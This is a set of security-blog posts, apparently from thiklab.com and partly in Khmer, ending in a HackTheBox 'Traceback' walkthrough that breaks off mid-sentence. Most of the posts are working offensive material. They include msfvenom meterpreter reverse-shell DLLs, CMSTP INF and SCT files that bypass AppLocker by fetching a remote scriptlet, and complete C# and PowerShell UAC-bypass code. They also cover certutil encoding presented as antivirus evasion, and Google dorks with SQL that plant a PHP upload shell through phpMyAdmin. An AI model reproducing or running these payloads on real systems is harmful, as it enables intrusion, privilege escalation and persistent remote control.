[{"content":"ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវិនដូ៖\n1 2  C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង blog របស់គាត់។\nDLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។\n1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll \u0026gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\\Users\\Victim\\idm.dll  [Strings] AppAct = \u0026#34;SOFTWARE\\Microsoft\\Connection Manager\u0026#34; ServiceName=\u0026#34;idm\u0026#34; ShortSvcName=\u0026#34;idm\u0026#34;   រក្សាទុកជា \u0026ldquo;idm-service.inf\u0026rdquo;\nបើកដំណើរការ Multi/handler នៅលើម៉ាស៊ីនមេ និង កំណត់ទទួលការតភ្ជាប់។\nPayload នឹងដំណើរការភ្លាមៗនៅពេលដែលឯកសារ INF ត្រូវ​បាន​បើក​ដោយ​ប្រើប្រាស់ CMSTP ។\nបន្ទាប់មក Metasploit និងទទួលបាន Reverse-Shell ក្រោយពីស្គ្រីបបានបើកឯកសារ DLL រួច។\nSCT CMSTP ក៏អាចប្រើប្រាស់ឯកសារប្រភេទ SCT ដើម្បី​ទាញយក​ពាក្យ​បញ្ជា​ផ្សេងៗ​ពីម៉ាស៊ីនមេ​មក​ប្រើប្រាស់​ផង​ដែរ។\nលោក Nick Tyrere ក៏បានបង្ហាញនៅក្នុង Twitter ផងដែរ។\nលោកក៏បានបង្កើតស្គ្រីបនេះដោយដាក់ឈ្មោះថា powersct.sct ដែល​​ប្រើ​សម្រាប់​បើក​ដំណើរ​ការ​ពាក្យ​បញ្ជា​គ្រោះ​ថ្នាក់​ណាមួយ​ចេញ​ពី PowerShell ។\nសម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងដំណរភ្ជាប់របស់ឯកសារ SCT ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] %11%\\scrobj.dll,NI,http://192.168.200.55/pentestlab.sct  [Strings] AppAct = \u0026#34;SOFTWARE\\Microsoft\\Connection Manager\u0026#34; ServiceName=\u0026#34;idm\u0026#34; ShortSvcName=\u0026#34;idm\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ### powersct.sct \u0026lt;?XML version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration  progid=\u0026#34;Pentest\u0026#34; classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;!-- Proof Of Concept - @netbiosX --\u0026gt; \u0026lt;script language=\u0026#34;JScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;cmd /k cd c:\\ \u0026amp; pentestlab.exe\u0026#34;);\t \t]]\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ### SCT File Obfuscation Examples: \u0026lt;?XML version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration  progid=\u0026#34;PoC\u0026#34; classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;!-- Proof Of Concept - Casey Smith @subTee --\u0026gt; \u0026lt;!-- License: BSD3-Clause --\u0026gt; \u0026lt;script language=\u0026#34;JScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ //x86 only. C:\\Windows\\Syswow64\\regsvr32.exe /s /u /i:file.sct scrobj.dll var scr = new ActiveXObject(\u0026#34;MSScriptControl.ScriptControl\u0026#34;); scr.Language = \u0026#34;JScript\u0026#34;; scr.ExecuteStatement(\u0026#39;var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;calc.exe\u0026#34;);\u0026#39;); scr.Eval(\u0026#39;var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;calc.exe\u0026#34;);\u0026#39;); //https://msdn.microsoft.com/en-us/library/aa227637(v=vs.60).aspx //Lots of hints here on futher obfuscation ]]\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt;   នៅពេលដំណើរការស្ក្រីបនៃឯកសារ INF វានឹងលោត​ផ្ទាំង​វិន​ដូមួយ​ចេញ​មក​ដើម្បី​ដំណើរ​ការ​ពាក្យ​បញ្ជា PowerShell ។\nក្រោយដំណើរការស្ក្រីបរួច ឯកសារមេរោគនិងធ្វើការទាញយកពីម៉ាស៊ីនមេហើយធ្វើប្រតិបត្តិភ្លាមៗតែម្ដង។\nពេលនោះ Metasploit និងទទួលបាន Reverse-Shell ហើយគ្រប់​គ្រង​ម៉ាស៊ីន​ទាំង​មូល៕\nឯកសារយោង:\n pentestlab.blog ha.cker.in ired.team  ","description":"Bypass applocker with cmstp to dll reverseshell.","id":4,"section":"posts","tags":["dll","bypass","inf","sct"],"title":"AppLocker Bypass - CMSTP","uri":"https://thiklab.com/posts/applocker-bypass-cmstp/"},{"content":"ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវិនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ ps1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។\nC# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.exe microsoft binary. Code author: Andre Marques (@_zc00l) */ using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Windows; using System.Runtime.InteropServices; public class CMSTPBypass { // Our .INF file data!  public static string InfData = @\u0026#34;[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install REPLACE_COMMAND_LINE taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \u0026#34;\u0026#34;HKLM\u0026#34;\u0026#34;, \u0026#34;\u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\u0026#34;\u0026#34;, \u0026#34;\u0026#34;ProfileInstallPath\u0026#34;\u0026#34;, \u0026#34;\u0026#34;%UnexpectedError%\u0026#34;\u0026#34;, \u0026#34;\u0026#34;\u0026#34;\u0026#34; [Strings] ServiceName=\u0026#34;\u0026#34;CorpVPN\u0026#34;\u0026#34; ShortSvcName=\u0026#34;\u0026#34;CorpVPN\u0026#34;\u0026#34; \u0026#34;; [DllImport(\u0026#34;user32.dll\u0026#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); public static string BinaryPath = \u0026#34;c:\\\\windows\\\\system32\\\\cmstp.exe\u0026#34;; /* Generates a random named .inf file with command to be executed with UAC privileges */ public static string SetInfFile(string CommandToExecute) { string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(\u0026#34;.\u0026#34;))[0]; string TemporaryDir = \u0026#34;C:\\\\windows\\\\temp\u0026#34;; StringBuilder OutputFile = new StringBuilder(); OutputFile.Append(TemporaryDir); OutputFile.Append(\u0026#34;\\\\\u0026#34;); OutputFile.Append(RandomFileName); OutputFile.Append(\u0026#34;.inf\u0026#34;); StringBuilder newInfData = new StringBuilder(InfData); newInfData.Replace(\u0026#34;REPLACE_COMMAND_LINE\u0026#34;, CommandToExecute); File.WriteAllText(OutputFile.ToString(), newInfData.ToString()); return OutputFile.ToString(); } public static bool Execute(string CommandToExecute) { if(!File.Exists(BinaryPath)) { Console.WriteLine(\u0026#34;Could not find cmstp.exe binary!\u0026#34;); return false; } StringBuilder InfFile = new StringBuilder(); InfFile.Append(SetInfFile(CommandToExecute)); Console.WriteLine(\u0026#34;Payload file written to \u0026#34; + InfFile.ToString()); ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath); startInfo.Arguments = \u0026#34;/au \u0026#34; + InfFile.ToString(); startInfo.UseShellExecute = false; Process.Start(startInfo); IntPtr windowHandle = new IntPtr(); windowHandle = IntPtr.Zero; do { windowHandle = SetWindowActive(\u0026#34;cmstp\u0026#34;); } while (windowHandle == IntPtr.Zero); System.Windows.Forms.SendKeys.SendWait(\u0026#34;{ENTER}\u0026#34;); return true; } public static IntPtr SetWindowActive(string ProcessName) { Process[] target = Process.GetProcessesByName(ProcessName); if(target.Length == 0) return IntPtr.Zero; target[0].Refresh(); IntPtr WindowHandle = new IntPtr(); WindowHandle = target[0].MainWindowHandle; if(WindowHandle == IntPtr.Zero) return IntPtr.Zero; SetForegroundWindow(WindowHandle); ShowWindow(WindowHandle, 5); return WindowHandle; } }   ផ្អែកលើការងារពីមុនរបស់លោក Oddvar Moe\nផ្អែកលើ PowerShell ស្គ្រីបរបស់លោក Tyler Applebaum\nចម្លងកូដខាងលើរក្សាទុកជា \u0026ldquo;Source.cs\u0026rdquo;\nដើម្បីបំប្លែងកូដទៅជាឯកសារ dll យើងអាចប្រើពាក្យបញ្ជានៅលើ powershell ដូចខាងក្រោម៖\n1  Add-Type -TypeDefinition ([IO.File]::ReadAllText(\u0026#34;$pwd\\Source.cs\u0026#34;)) -ReferencedAssemblies \u0026#34;System.Windows.Forms\u0026#34; -OutputAssembly \u0026#34;CMSTP-UAC-Bypass.dll\u0026#34;   ក្រោយបំប្លែងរួចវានឹងបង្កើតចេញជាឯកសារមួយមានឈ្មោះថា \u0026ldquo;CMSTP-UAC-Bypass.dll\u0026rdquo;\nBypass UAC ដើម្បីប្រើប្រាស់ឯកសារ dll ដែលបានបង្កើតរួចឲ្យដំណើរការ Bypass UAC យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3 4 5 6 7  PS C:\\\u0026gt; [Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\u0026#34;$pwd\\CMSTP-UAC-Bypass.dll\u0026#34;)) GAC Version Location --- ------- -------- False v4.0.30319 PS C:\\\u0026gt; [CMSTPBypass]::Execute(\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;)   ក្រោយពីរដំណើររួច នឹងមានលោតផ្ទាំង cmd អមមកជាមួយនិងសិទ្ធជា administrator ។\nដូចដែលបានឃើញគឺយើងអាចធ្វើការ bypass uac បានសម្រេចដោយឈរនៅលើសិទ្ធិអ្នកប្រើប្រាស់ធម្មតា៕\nBonus - Bypass With PS1 (One File Action) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133  # UAC Bypass poc using SendKeys # Version 1.0 # Author: Oddvar Moe # Functions borrowed from: https://powershell.org/forums/topic/sendkeys/ # Todo: Hide window on screen for stealth # Todo: Make script edit the INF file for command to inject... Function script:Set-INFFile { [CmdletBinding()] Param ( [Parameter(HelpMessage=\u0026#34;Specify the INF file location\u0026#34;)] $InfFileLocation = \u0026#34;$env:temp\\CMSTP.inf\u0026#34;, [Parameter(HelpMessage=\u0026#34;Specify the command to launch in a UAC-privileged window\u0026#34;)] [String]$CommandToExecute = \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; #your action here ) $InfContent = @\u0026#34; [version] Signature=`$chicago`$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install $CommandToExecute taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \u0026#34;HKLM\u0026#34;, \u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\u0026#34;, \u0026#34;ProfileInstallPath\u0026#34;, \u0026#34;%UnexpectedError%\u0026#34;, \u0026#34;\u0026#34; [Strings] ServiceName=\u0026#34;CorpVPN\u0026#34; ShortSvcName=\u0026#34;CorpVPN\u0026#34; \u0026#34;@ $InfContent | Out-File $InfFileLocation -Encoding ASCII } Function Get-Hwnd { [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName ) Process { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Try { $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle } Catch { $hwnd = $null } $hash = @{ ProcessName = $ProcessName Hwnd = $hwnd } New-Object -TypeName PsObject -Property $hash } } function Set-WindowActive { [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name ) Process { $memberDefinition = @\u0026#39; [DllImport(\u0026#34;user32.dll\u0026#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); \u0026#39;@ Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32 $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd If ($hwnd) { $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0) [User32.Api]::SetForegroundWindow($hwnd) [User32.Api]::ShowWindow($hwnd, 5) } Else { [string] $hwnd = \u0026#39;N/A\u0026#39; } $hash = @{ Process = $Name Hwnd = $hwnd } New-Object -TypeName PsObject -Property $hash } } . Set-INFFile #Needs Windows forms add-type -AssemblyName System.Windows.Forms If (Test-Path $InfFileLocation) { #Command to run $ps = new-object system.diagnostics.processstartinfo \u0026#34;c:\\windows\\system32\\cmstp.exe\u0026#34; $ps.Arguments = \u0026#34;/au $InfFileLocation\u0026#34; $ps.UseShellExecute = $false #Start it [system.diagnostics.process]::Start($ps) do { # Do nothing until cmstp is an active window } until ((Set-WindowActive cmstp).Hwnd -ne 0) #Activate window Set-WindowActive cmstp #Send the Enter key [System.Windows.Forms.SendKeys]::SendWait(\u0026#34;{ENTER}\u0026#34;) }   ឯកសារដើម:\n https://0x00-0x00.github.io tylerapplebaum  ","description":"Craft a powershell script to bypass uac with dll method.","id":5,"section":"posts","tags":["dll","bypass"],"title":"Bypass UAC DLL Method","uri":"https://thiklab.com/posts/bypass-uac-dll-method/"},{"content":"Generate DLL Payload In penetration testing system open terminal and type.\n1  msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b \u0026#39;\\x00\\xff\u0026#39; -f dll \u0026gt; idm.dll   Run DLL In windows 7/8/10 open CMD and type.\n1  cmd\u0026gt; c:\\Windows\\System32\\rundll32.exe c:\\Users\\Zyzz\\Desktop\\idm32.dll,xoxo   The tricks is to put the *,xoxo* or any strings after *.dll* file, if not the file will not work.\nGet Reverse Shell Go back to metasploit and get the shell.\n","description":"The way to run dll payloads in windows os.","id":6,"section":"posts","tags":["dll","metasploit","reverseshell"],"title":"Run DLL Payloads","uri":"https://thiklab.com/posts/run-dll/"},{"content":"The idea is to store an exe file as a text format and download from the cloud.\nCertutil Encode In windows 7/8/10 open CMD and type.\n1  cmd\u0026gt; certutil -encode file.exe file.txt   This will encrypt the file as base64 into a text format.\nAfter encrypted the file will look like this.\n1 2 3 4 5 6 7 8  -----BEGIN CERTIFICATE----- TVp4AAEAAAAEAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA m21gKiFxNcsclCLVL6Q01cECa/UD1Am02MYPaESJirs/s/5l1TKlKGnQQLTZymuI 1ZJiqgSCbkCdi1scpPQEk+IVPuYnVa91h1qWPA4PO/G2K4M7lQqRrGdQ57i3A+yM v+8J1Zx3eaAnAxpg0FDfzyrUVS4Wc45KE9FVEJTyk706+qFXhvey4pGUSFkH1obG g3mE2SaLGbMQPkC95pNe/vfqyQ4MFgulk1HcL9XA3AyprIVj2H0ve91ip0aeIcOC rzno9vOnK3OrUKUVl9CK2s56VsHUAjmreyKs6cyUxfWUDI6is3NxuSR8AAAAAAAA -----END CERTIFICATE-----   Certutil Decode To decode the file just type.\n1  cmd\u0026gt; certutil -decode file.txt file.exe   This method also can bypass an anti-virus in windows.\nSource: docs.microsoft.com\n","description":"An idea to convert a binary file to text format.","id":7,"section":"posts","tags":["converter"],"title":"Convert ExE To Text File","uri":"https://thiklab.com/posts/convert-exe-to-txt/"},{"content":"Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query Go to phpMyadmin database and create new database, ex: \u0026ldquo;uploader\u0026rdquo; and than select on SQL tap and paste this code below.\n1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   And this code.\n1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   Now select on table user_upload and SQL tap and paste this code below.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(\u0026#39;\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Uploader\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\u0026#34;black\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div style=\u0026#34;color:white;margin-top:150px;\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Uploader\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;uploader.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;userfile\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\u0026#39;);   And this code.\n1  select*intodumpfile\u0026#39;C:/xampp/htdocs/wkspace/up.php\u0026#39;fromuserform   To find the path of the database webserver, we can use this syntax \u0026ldquo;SELECT @@datadir\u0026rdquo; on the SQL query SQL Cheatsheet\nAfter that paste this code below in user_upload table.\n1 2 3 4 5 6  INSERTINTOuser_uploadVALUES(\u0026#34;\u0026lt;?php $uploaddir = \u0026#39;C:/xampp/htdocs/wkspace/\u0026#39;; $uploadfile = $uploaddir . basename($_FILES[\u0026#39;userfile\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;userfile\u0026#39;][\u0026#39;tmp_name\u0026#39;],$uploadfile)) { print \u0026#39;\u0026lt;body bgcolor=black\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2 style=color:white;margin-top:150px;\u0026gt;Uploaded successully.\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; } else { print \u0026#39;\u0026lt;body bgcolor=black\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2 style=color:red;margin-top:150px;\u0026gt;Uploaded Failed.\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; } ?\u0026gt;\u0026#34;)   And finally paste this code below.\n1  select*intodumpfile\u0026#39;C:/xampp/htdocs/wkspace/uploader.php\u0026#39;fromuser_upload   Now browse to the file location and load the uploader.\n","description":"Easy way to upload shell via phpmyadmin.","id":8,"section":"posts","tags":["fileupload","googledork"],"title":"Upload Shell Via phpMyAdmin","uri":"https://thiklab.com/posts/upload-shell-via-phpmyadmin/"},{"content":"Recon ជាដំបូងខ្ញុំប្រើ Nmap ដើម្បីស្វែងរកផតដែលបានបើក និងសេវាកម្មដែលបានប្រើ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  :~$ sudo nmap -sC -sV 10.10.10.181 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 13:29 +07 Nmap scan report for 10.10.10.181 Host is up (0.29s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   ដូចដែលបានឃើញ គឺមានតែផតពីរប៉ុណ្នោះដែលបានបើកគឺផត ២២(ssh) និងផង ៨០(http)\nOSINT ក្រោយពីស្កេនរួចមកខ្ញុំក៏ចូលទៅកាន់អាស័យដ្ឋាន http://10.10.10.181:80 ហើយក៏បានឃើញដូចរូបដូចខាងក្រោម៖\nខ្ញុំចុច Ctrl+U ដើម្បីចូលមើលកូដខាងក្នុង ក៏ឃើញមាននូវព័ត៌មានមួយចំនួន៖\nខ្ញុំចាប់ផ្ដើមស្វែងរកឈ្មោះម្ចាស់គណនី Xh4H នៅក្នុង Google ហើយក៏បានរកឃើញនូវ Github របស់ម្ចាស់គណនី។\nបន្ទាប់មកខ្ញុំបានចូលទៅមើលក្នុង Repositories នោះហើយក៏ឃើញមាន Repository មួយមានឈ្មោះថា Web-Shells\nខ្ញុំបានសាកល្បងចូលទៅតាមឈ្មោះរបស់ Shell រហូតដល់ឯកសារឈ្មោះថា smevk.php ដែលលោតចេញនៅផ្ទាំងបំពេញបែបបត់ចូល\nលេខសំងាត់របស់វាគឺ admin/admin ខ្ញុំក៏បានចូលទៅក្នុង Web Server បានសម្រេច។\nGet User ដើម្បីបាន User Flag ជាដំបូងខ្ញុំបានចូលទៅក្នុង /home/ តាមរយៈ Web-Shell ហើយក៏ឃើញមានគណនីអ្នកប្រើប្រាស់ចំនួនពីរ sysadmin/webadmin ដោយគណនី sysadmin ខ្ញុំមិនអាចមានសិទ្ធិចូលទៅក្នុងបានទេដូចនេះខ្ញុំចូលបានតែគណនី webadmin មួយប៉ុណ្នោះ។\nក្រោយមកខ្ញុំក៏ឃើញមានថតឯកសារមួយឈ្មោះថា .ssh និង ឯងសារមួយទៀតឈ្មោះថា authorised_keys\nដូចនេះខ្ញុំក៏បានបង្កើតនៅ SSH-Key ហើយដាក់វាចូលទៅក្នុងឯកសារនោះដើម្បីមានសិទ្ធិចូលទៅកាន់ម៉ាស៊ីនមេតាមរយៈ SSH\nក្រោយពីចូលតាមរយៈ SSH រួចមកខ្ញុំបានឃើញឯកសារមួយឈ្មោះ note.txt ដែលក្នុងនោះមានអត្ថន័យថា៖\n1 2 3 4  - sysadmin - I have left a tool to practice Lua. I\u0026#39;m sure you know where to find it. Contact me if you have any question.   ខ្ញុំក៏សាកស្វែងរកមើលឯកសារនៅក្នុងនោះ ហើយក៏បានរកឃើញប្រវត្តិប្រើប្រាស់ពាក្យបញ្ជាចាស់ៗ របស់អ្នកប្រើប្រាស់ដូចខាងក្រោម៖\n1 2 3 4 5 6 7  webadmin@traceback:~$ cat .bash_history ls -la sudo -l nano privesc.lua sudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lua logout   ដោយដឹងថា luvit ជាប្រភេទ lua script ដែលមានលទ្ធិភាពក្នុងការ execute និងបើកមើលនូវរាល់ឯកសារណាដែលមាននៅក្នុងគណនី sysadmin បានដូចនេះខ្ញុំក៏បង្កើត Script តូចមួយដើម្បីចូលទៅបើកមើលឯកសារ user.txt ដែលមាននៅក្នុងគណនី sysadmin ផ្ទាល់តែម្ដង។\n1  webadmin@traceback:~$ echo \u0026#34;os.execute(\u0026#34;cat /home/sysadmin/user.txt\u0026#34;) \u0026gt; user.lua   បន្ទាប់មកខ្ញុំបានប្រើប្រាស់ឯកសារ luvit ដដែលដើម្បីបើកឯកសារ user.lua\n1 2  webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit user.lua 23c296e8cxxxxxxxxxxxxxxxxxxxxxec   ដូចនេះខ្ញុំក៏ទទួលបាន User Flag ដូចដែលបានបង្ហាញខាងលើ។\nGet Root ដោយប្រើប្រាស់ឯកសារ luvit ខ្ញុំអាចមានសិទ្ធិចូលជាគណនីរបស់ sysadmin បានដោយប្រើប្រាស់វិធីដូចខាងក្រោម៖\n1 2 3  webadmin@traceback:~$ echo \u0026#34;os.execute(\u0026#34;/bin/bash\u0026#34;) \u0026gt; sys.lua webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit sys.lua sysadmin@traceback:~$   ដូចដែលបានឃើញគឺខ្ញុំមានសិទ្ធិប្ដូរទៅជាគណនី sysadmin វិញដោយប្រើប្រាស់ Lua Script\nបន្ទាប់ពីមានសិទ្ធិជា sysadmin ហើយខ្ញុំក៏ដាក់ SSH-Key ចូលទៅក្នុងប្រអប់ .ssh ដើម្បីអាច SSH ចូលទៅក្នុងគណនី sysadmin បានដូចពីពេលមុនដែរ។\nបន្តទៀតខ្ញុំត្រូវការមើល Process របស់គណនី root ថាតើកំពុងតែប្រើពាក្យបញ្ជាអ្វីខ្លះ។ ដោយសារតែមិនមានសិទ្ធិជា root ចឹងហើយទើបជម្រើសដែលល្អបំផុតគឺប្រើប្រាស់ Tool ខាងក្រៅហើយ Tool ដែលខ្ញុំប្រើនោះគឺឈ្មោះ pspy64 ដែលវាមានលទ្ធិភាពក្នុងការមើល Process គ្រប់គណនីទាំងអស់បើទោះបីជាគ្មានសិទ្ធិជា root ក៏ដោយ។\nទាញយក៖ pspy64\nដើម្បី Upload ឯកសារនេះបានខ្ញុំត្រូវប្រើប្រាស់ពាក្យបញ្ជា scp\n1  :~$ sudo scp -i id_rsa pspy64 sysadmin@10.10.10.181:/tmp/   ខ្ញុំបានបើកដំណើរការឯកសារ pspy64 នោះ ហើយវាបានបញ្ចេញនូវព័ត៌មានដូចខាងក្រោម៖\n1 2 3 4 5 6  2020/05/21 04:02:01 CMD: UID=0 PID=6094 | sleep 30 2020/05/21 04:02:01 CMD: UID=0 PID=6093 | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/05/21 04:02:01 CMD: UID=0 PID=6092 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/05/21 04:02:01 CMD: UID=0 PID=6091 | /usr/sbin/CRON -f 2020/05/21 04:02:01 CMD: UID=0 PID=6090 | /usr/sbin/CRON -f 2020/05/21 04:02:31 CMD: UID=0 PID=6096 | /bin/cp /var/backups/.update-motd.d/ /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/   អ្វីដែលគួរឲ្យចាប់អារម្មណ៏នោះគឺត្រង់កន្លែង \u0026ldquo;/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\u0026rdquo; និង \u0026ldquo;sleep 30\u0026rdquo; មានន័យថារាល់ពេល ៣០វិនាទីម្ដងម៉ាស៊ីនមួយនេះនឹងធ្វើការថតចម្លងគ្រប់ឯកសារទាំងអស់ដែលស្ថិតនៅក្នុងថតឯកសារ /var/backups/.update-motd.d/ យកទៅដាក់ចូលទៅក្នុងថតឯកសារ /etc/update-motd.d/ ដែលជាថតឯកសារមេរបស់ម៉ាស៊ីន និង 